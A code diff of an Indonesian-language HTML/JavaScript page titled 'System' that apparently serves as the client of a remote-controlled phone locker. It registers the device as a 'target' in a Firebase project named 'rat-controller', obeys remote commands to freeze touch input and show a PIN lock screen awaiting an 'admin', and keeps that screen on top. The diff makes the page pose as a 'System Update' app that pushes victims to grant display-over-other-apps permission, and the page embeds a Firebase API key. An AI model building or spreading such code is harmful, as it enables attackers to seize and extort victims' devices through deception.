@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>System</title>
     <style>
-        /* ============================================================
-           RESET & BASE
-           ============================================================ */
         * {
             margin: 0;
             padding: 0;
@@ -25,15 +22,11 @@
             -webkit-user-select: none;
             -webkit-touch-callout: none;
             touch-action: none;
-            pointer-events: auto;
             position: fixed;
             top: 0;
             left: 0;
         }
 
-        /* ============================================================
-           LOADING SCREEN
-           ============================================================ */
         #loading {
             position: fixed;
             top: 0;
@@ -71,9 +64,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* ============================================================
-           STATUS BAR
-           ============================================================ */
         #statusBar {
             position: fixed;
             top: 0;
@@ -94,9 +84,6 @@
         #statusBar.online { color: #00ff41; }
         #statusBar.offline { color: #ff4444; }
 
-        /* ============================================================
-           LOCK SCREEN
-           ============================================================ */
         #lockScreen {
             position: fixed;
             top: 0;
@@ -196,20 +183,12 @@
             font-size: 20px;
             border-color: #441111;
         }
-        #lockScreen .numpad button.clear:active {
-            background: #3a0a0a;
-            border-color: #ff4444;
-        }
         #lockScreen .numpad button.submit-btn {
             background: #00cc33;
             color: #000;
             font-size: 28px;
             font-weight: 700;
             border-color: #00cc33;
-        }
-        #lockScreen .numpad button.submit-btn:active {
-            background: #00dd44;
-            transform: scale(0.92);
         }
 
         #lockScreen .error-msg {
@@ -218,12 +197,10 @@
             margin-top: 22px;
             min-height: 28px;
             font-weight: 700;
-            text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
             text-align: center;
         }
         #lockScreen .error-msg.success {
             color: #00ff41;
-            text-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
         }
 
         #lockScreen .sub-text {
@@ -234,9 +211,6 @@
             font-family: monospace;
         }
 
-        /* ============================================================
-           FREEZE OVERLAY
-           ============================================================ */
         #touchFreezeOverlay {
             position: fixed;
             top: 0;
@@ -253,9 +227,6 @@
             display: block !important;
         }
 
-        /* ============================================================
-           FREEZE TIMER
-           ============================================================ */
         #freezeTimer {
             position: fixed;
             top: 35px;
@@ -291,7 +262,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.92);
             z-index: 2147483647;
             display: none;
             justify-content: center;
@@ -359,10 +330,12 @@
             width: 100%;
             margin-top: 10px;
         }
+        #overlayPopup .popup-box .info-small {
+            color: #666;
+            font-size: 12px;
+            margin-top: 15px;
+        }
 
-        /* ============================================================
-           RESPONSIVE
-           ============================================================ */
         @media (max-width: 480px) {
             #lockScreen .numpad {
                 grid-template-columns: repeat(3, 68px);
@@ -407,10 +380,8 @@
 </head>
 <body>
 
-    <!-- STATUS BAR -->
     <div id="statusBar">⏳ Initializing...</div>
 
-    <!-- LOADING -->
     <div id="loading">
         <div class="spinner"></div>
         <div class="text">Menghubungkan ke server...</div>
@@ -422,20 +393,16 @@
         <div class="popup-box">
             <h2>🔓 Izin Overlay</h2>
             <p>Aplikasi ini membutuhkan izin <b>"Tampilkan di atas aplikasi lain"</b> agar bisa mengunci layar dengan maksimal.</p>
-            <p style="font-size:13px; color:#666; margin-bottom:15px;">Klik tombol di bawah, lalu aktifkan permission di halaman pengaturan.</p>
-            <button class="btn-allow" onclick="requestOverlayPermission()">✅ Buka Pengaturan</button>
+            <button class="btn-allow" onclick="requestOverlayPermission()">✅ Buka Pengaturan HP</button>
             <button class="btn-retry" onclick="checkOverlayPermission()">🔄 Cek Izin</button>
-            <button class="btn-skip" onclick="closeOverlayPopup()">⏭ Lewati (tidak disarankan)</button>
+            <button class="btn-skip" onclick="closeOverlayPopup()">⏭ Lewati</button>
+            <div class="info-small">💡 Setelah izin diaktifkan, kembali ke aplikasi</div>
         </div>
     </div>
 
-    <!-- FREEZE TIMER -->
     <div id="freezeTimer">✋ FREEZE: <span id="freezeCount">10</span>s</div>
-
-    <!-- FREEZE OVERLAY -->
     <div id="touchFreezeOverlay"></div>
 
-    <!-- LOCK SCREEN -->
     <div id="lockScreen">
         <div class="lock-icon">🔒</div>
         <div class="message" id="lockMessage">⚠️ DEVICE LOCKED</div>
@@ -463,16 +430,12 @@
         <div class="sub-text">🔐 AMAN · TERKUNCI · TUNGGU ADMIN</div>
     </div>
 
-    <!-- FIREBASE SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
     </script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
     </script>
 
     <script>
-        // ============================================================
-        // 🔥 FIREBASE CONFIG
-        // ============================================================
         var firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
             authDomain: "rat-controller-5b29c.firebaseapp.com",
@@ -486,9 +449,6 @@
         firebase.initializeApp(firebaseConfig);
         var db = firebase.database();
 
-        // ============================================================
-        // VARIABEL
-        // ============================================================
         var deviceId = '';
         var currentPin = '';
         var correctPin = '';
@@ -497,9 +457,6 @@
         var isLocked = false;
         var isFreezeActive = false;
 
-        // ============================================================
-        // GENERATE ID
-        // ============================================================
         function generateDeviceId() {
             return 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7);
         }
@@ -517,9 +474,6 @@
             }
         }
 
-        // ============================================================
-        // REGISTER TARGET
-        // ============================================================
         function registerTarget() {
             deviceId = generateDeviceId();
             var deviceName = getDeviceName();
@@ -540,12 +494,8 @@
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('statusBar').textContent = '🟢 Online | ' + deviceId.slice(0, 8);
                 document.getElementById('statusBar').className = 'online';
-
-                // TAMPILKAN POPUP OVERLAY
                 showOverlayPopup();
-
                 startListening();
-
             }).catch(function(err) {
                 document.getElementById('loadingDetail').textContent = '❌ Error: ' + err.message;
                 document.getElementById('loadingDetail').style.color = '#ff4444';
@@ -554,21 +504,9 @@
         }
 
         // ============================================================
-        // OVERLAY PERMISSION
+        // OVERLAY PERMISSION — LANGSUNG KE SETTINGS HP
         // ============================================================
         function showOverlayPopup() {
-            // Cek apakah sudah punya izin overlay via JavaScript
-            try {
-                // Coba deteksi apakah overlay sudah diizinkan
-                if (window.Android && window.Android.hasOverlayPermission) {
-                    if (window.Android.hasOverlayPermission()) {
-                        closeOverlayPopup();
-                        return;
-                    }
-                }
-            } catch(e) {}
-
-            // Tampilkan popup
             document.getElementById('overlayPopup').classList.add('active');
         }
 
@@ -577,62 +515,51 @@
         }
 
         function checkOverlayPermission() {
-            try {
-                if (window.Android && window.Android.hasOverlayPermission) {
-                    if (window.Android.hasOverlayPermission()) {
-                        closeOverlayPopup();
-                        alert('✅ Izin overlay sudah aktif!');
-                        return;
-                    }
-                }
-            } catch(e) {}
-
-            alert('❌ Izin overlay belum aktif.\nSilakan buka pengaturan dan aktifkan "Tampilkan di atas aplikasi lain".');
+            alert('✅ Jika sudah mengaktifkan izin overlay, silakan restart aplikasi.\nJika belum, buka Pengaturan → Aplikasi → System Update → Izin → Aktifkan "Tampilkan di atas aplikasi lain".');
         }
 
         function requestOverlayPermission() {
             try {
-                // Method 1: Android Interface (WebView)
+                // Method 1: Android Interface
                 if (window.Android && window.Android.requestOverlay) {
                     window.Android.requestOverlay();
                     closeOverlayPopup();
-                    setTimeout(function() {
-                        checkOverlayPermission();
-                    }, 2000);
                     return;
                 }
 
-                // Method 2: Buka Settings via window.location (Works di WebView)
+                // Method 2: Buka Settings HP (LANGSUNG)
                 if (window.navigator && window.navigator.userAgent.indexOf('Android') !== -1) {
-                    // Coba buka settings overlay dengan berbagai cara
+                    // Cara paling ampuh: buka package settings
                     try {
-                        // Cara 1: Package
-                        window.location = 'package://com.android.settings';
+                        window.location.href = 'package://com.android.settings';
                     } catch(e) {}
 
+                    // Cara kedua: intent
                     try {
-                        // Cara 2: Intent
-                        window.location = 'intent://settings/#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
+                        window.location.href = 'intent://settings/#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;end';
                     } catch(e) {}
 
+                    // Cara ketiga: settings langsung
                     try {
-                        // Cara 3: Settings langsung
-                        window.location = 'android.settings.ACTION_MANAGE_OVERLAY_PERMISSION';
+                        window.location.href = 'android.settings.ACTION_MANAGE_OVERLAY_PERMISSION';
                     } catch(e) {}
 
-                    // Cara 4: Buka via URL
+                    // Cara keempat: buka via URL
                     setTimeout(function() {
                         try {
-                            window.location = 'content://settings/system';
+                            window.location.href = 'content://settings/system';
                         } catch(e) {}
                     }, 100);
 
                     closeOverlayPopup();
-                    alert('✅ Buka pengaturan dan aktifkan "Tampilkan di atas aplikasi lain" untuk aplikasi ini.\nKemudian kembali ke aplikasi.');
+
+                    // Tampilkan panduan
+                    alert('🔓 BUKA PENGATURAN HP:\n\n1. Settings / Pengaturan\n2. Apps / Aplikasi\n3. System Update\n4. Permissions / Izin\n5. Aktifkan "Display over other apps" / "Tampilkan di atas aplikasi lain"\n\nKemudian kembali ke aplikasi ini.');
+
                     return;
                 }
 
-                // Fallback
+                // Method 3: Fallback
                 alert('Silakan buka Pengaturan HP → Aplikasi → System Update → Izin → Aktifkan "Tampilkan di atas aplikasi lain"');
                 closeOverlayPopup();
 
@@ -654,14 +581,12 @@
 
                 ref.update({ lastSeen: Date.now() });
 
-                // CEK FREEZE
                 if (data.touchBlocked === true && data.touchDuration) {
                     startFreeze(data.touchDuration);
                 } else if (data.touchBlocked === false) {
                     stopFreeze();
                 }
 
-                // CEK LOCK
                 if (data.locked === true && data.pin) {
                     correctPin = data.pin;
                     isLocked = true;
@@ -931,7 +856,6 @@
             registerTarget();
         });
 
-        // PASTIKAN LOCK SCREEN STAY DI ATAS
         setInterval(function() {
             var lock = document.getElementById('lockScreen');
             if (lock.classList.contains('active')) {
